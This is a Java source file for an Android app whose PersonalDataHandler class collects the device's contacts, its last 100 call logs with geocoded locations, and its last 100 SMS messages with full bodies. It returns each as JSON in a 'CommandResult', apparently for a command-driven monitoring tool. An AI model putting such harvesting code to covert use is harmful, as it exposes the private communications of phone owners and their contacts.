package com.idsiber.eye.handlers;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Telephony;
import android.util.Log;
import androidx.core.app.ActivityCompat;

import com.idsiber.eye.CommandResult;

import org.json.JSONArray;
import org.json.JSONObject;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

/**
 * Handler untuk data pribadi seperti kontak, call log, SMS
 */
public class PersonalDataHandler {
    private static final String TAG = "PersonalDataHandler";
    private Context context;

    public PersonalDataHandler(Context context) {
        this.context = context;
    }

    public CommandResult getContacts() {
        try {
            // Check permission
            if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_CONTACTS) 
                != PackageManager.PERMISSION_GRANTED) {
                return new CommandResult(false, "Contacts permission not granted", null);
            }

            JSONArray contactsArray = new JSONArray();
            Uri uri = ContactsContract.CommonDataKinds.Phone.CONTENT_URI;
            
            String[] projection = {
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                ContactsContract.CommonDataKinds.Phone.NUMBER,
                ContactsContract.CommonDataKinds.Phone.TYPE,
                ContactsContract.CommonDataKinds.Phone.CONTACT_ID
            };

            Cursor cursor = context.getContentResolver().query(uri, projection, null, null, null);
            
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    JSONObject contact = new JSONObject();
                    
                    String name = cursor.getString(cursor.getColumnIndexOrThrow(
                        ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                    String phoneNumber = cursor.getString(cursor.getColumnIndexOrThrow(
                        ContactsContract.CommonDataKinds.Phone.NUMBER));
                    int type = cursor.getInt(cursor.getColumnIndexOrThrow(
                        ContactsContract.CommonDataKinds.Phone.TYPE));
                    String contactId = cursor.getString(cursor.getColumnIndexOrThrow(
                        ContactsContract.CommonDataKinds.Phone.CONTACT_ID));
                    
                    contact.put("name", name != null ? name : "Unknown");
                    contact.put("phone_number", phoneNumber != null ? phoneNumber : "");
                    contact.put("phone_type", getPhoneTypeString(type));
                    contact.put("contact_id", contactId);
                    
                    contactsArray.put(contact);
                }
                cursor.close();
            }

            JSONObject result = new JSONObject();
            result.put("contacts", contactsArray);
            result.put("total_contacts", contactsArray.length());

            return new CommandResult(true, "Found " + contactsArray.length() + " contacts", result.toString());
        } catch (Exception e) {
            return new CommandResult(false, "Failed to get contacts: " + e.getMessage(), null);
        }
    }

    public CommandResult getCallLogs() {
        try {
            // Check permission
            if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_CALL_LOG) 
                != PackageManager.PERMISSION_GRANTED) {
                return new CommandResult(false, "Call log permission not granted", null);
            }

            JSONArray callLogsArray = new JSONArray();
            Uri uri = CallLog.Calls.CONTENT_URI;
            
            String[] projection = {
                CallLog.Calls.CACHED_NAME,
                CallLog.Calls.NUMBER,
                CallLog.Calls.TYPE,
                CallLog.Calls.DATE,
                CallLog.Calls.DURATION,
                CallLog.Calls.GEOCODED_LOCATION
            };

            String sortOrder = CallLog.Calls.DATE + " DESC LIMIT 100"; // Last 100 calls
            
            Cursor cursor = context.getContentResolver().query(uri, projection, null, null, sortOrder);
            
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    JSONObject call = new JSONObject();
                    
                    String name = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.CACHED_NAME));
                    String number = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER));
                    int type = cursor.getInt(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE));
                    long date = cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE));
                    long duration = cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION));
                    String location = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.GEOCODED_LOCATION));
                    
                    call.put("name", name != null ? name : "Unknown");
                    call.put("number", number != null ? number : "Unknown");
                    call.put("type", getCallTypeString(type));
                    call.put("date", date);
                    call.put("date_readable", new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date(date)));
                    call.put("duration", duration);
                    call.put("duration_readable", formatCallDuration(duration));
                    call.put("location", location != null ? location : "");
                    
                    callLogsArray.put(call);
                }
                cursor.close();
            }

            JSONObject result = new JSONObject();
            result.put("call_logs", callLogsArray);
            result.put("total_calls", callLogsArray.length());

            return new CommandResult(true, "Found " + callLogsArray.length() + " call logs", result.toString());
        } catch (Exception e) {
            return new CommandResult(false, "Failed to get call logs: " + e.getMessage(), null);
        }
    }

    public CommandResult getSmsMessages() {
        try {
            // Check permission
            if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_SMS) 
                != PackageManager.PERMISSION_GRANTED) {
                return new CommandResult(false, "SMS permission not granted", null);
            }

            JSONArray smsArray = new JSONArray();
            Uri uri = Telephony.Sms.CONTENT_URI;
            
            String[] projection = {
                Telephony.Sms.ADDRESS,
                Telephony.Sms.BODY,
                Telephony.Sms.DATE,
                Telephony.Sms.TYPE,
                Telephony.Sms.READ,
                Telephony.Sms.THREAD_ID
            };

            String sortOrder = Telephony.Sms.DATE + " DESC LIMIT 100"; // Last 100 messages
            
            Cursor cursor = context.getContentResolver().query(uri, projection, null, null, sortOrder);
            
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    JSONObject sms = new JSONObject();
                    
                    String address = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS));
                    String body = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY));
                    long date = cursor.getLong(cursor.getColumnIndexOrThrow(Telephony.Sms.DATE));
                    int type = cursor.getInt(cursor.getColumnIndexOrThrow(Telephony.Sms.TYPE));
                    int read = cursor.getInt(cursor.getColumnIndexOrThrow(Telephony.Sms.READ));
                    int threadId = cursor.getInt(cursor.getColumnIndexOrThrow(Telephony.Sms.THREAD_ID));
                    
                    sms.put("address", address != null ? address : "Unknown");
                    sms.put("body", body != null ? body : "");
                    sms.put("date", date);
                    sms.put("date_readable", new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date(date)));
                    sms.put("type", getSmsTypeString(type));
                    sms.put("is_read", read == 1);
                    sms.put("thread_id", threadId);
                    
                    smsArray.put(sms);
                }
                cursor.close();
            }

            JSONObject result = new JSONObject();
            result.put("sms_messages", smsArray);
            result.put("total_messages", smsArray.length());

            return new CommandResult(true, "Found " + smsArray.length() + " SMS messages", result.toString());
        } catch (Exception e) {
            return new CommandResult(false, "Failed to get SMS messages: " + e.getMessage(), null);
        }
    }

    private String getPhoneTypeString(int type) {
        switch (type) {
            case ContactsContract.CommonDataKinds.Phone.TYPE_HOME:
                return "Home";
            case ContactsContract.CommonDataKinds.Phone.TYPE_MOBILE:
                return "Mobile";
            case ContactsContract.CommonDataKinds.Phone.TYPE_WORK:
                return "Work";
            case ContactsContract.CommonDataKinds.Phone.TYPE_FAX_WORK:
                return "Work Fax";
            case ContactsContract.CommonDataKinds.Phone.TYPE_FAX_HOME:
                return "Home Fax";
            case ContactsContract.CommonDataKinds.Phone.TYPE_PAGER:
                return "Pager";
            case ContactsContract.CommonDataKinds.Phone.TYPE_OTHER:
                return "Other";
            case ContactsContract.CommonDataKinds.Phone.TYPE_CUSTOM:
                return "Custom";
            default:
                return "Unknown";
        }
    }

    private String getCallTypeString(int type) {
        switch (type) {
            case CallLog.Calls.INCOMING_TYPE:
                return "Incoming";
            case CallLog.Calls.OUTGOING_TYPE:
                return "Outgoing";
            case CallLog.Calls.MISSED_TYPE:
                return "Missed";
            case CallLog.Calls.VOICEMAIL_TYPE:
                return "Voicemail";
            case CallLog.Calls.REJECTED_TYPE:
                return "Rejected";
            case CallLog.Calls.BLOCKED_TYPE:
                return "Blocked";
            case CallLog.Calls.ANSWERED_EXTERNALLY_TYPE:
                return "Answered Externally";
            default:
                return "Unknown";
        }
    }

    private String getSmsTypeString(int type) {
        switch (type) {
            case Telephony.Sms.MESSAGE_TYPE_INBOX:
                return "Inbox";
            case Telephony.Sms.MESSAGE_TYPE_SENT:
                return "Sent";
            case Telephony.Sms.MESSAGE_TYPE_DRAFT:
                return "Draft";
            case Telephony.Sms.MESSAGE_TYPE_OUTBOX:
                return "Outbox";
            case Telephony.Sms.MESSAGE_TYPE_FAILED:
                return "Failed";
            case Telephony.Sms.MESSAGE_TYPE_QUEUED:
                return "Queued";
            default:
                return "Unknown";
        }
    }

    private String formatCallDuration(long seconds) {
        if (seconds < 60) {
            return seconds + "s";
        } else if (seconds < 3600) {
            long minutes = seconds / 60;
            long remainingSeconds = seconds % 60;
            return minutes + "m " + remainingSeconds + "s";
        } else {
            long hours = seconds / 3600;
            long minutes = (seconds % 3600) / 60;
            long remainingSeconds = seconds % 60;
            return hours + "h " + minutes + "m " + remainingSeconds + "s";
        }
    }
}
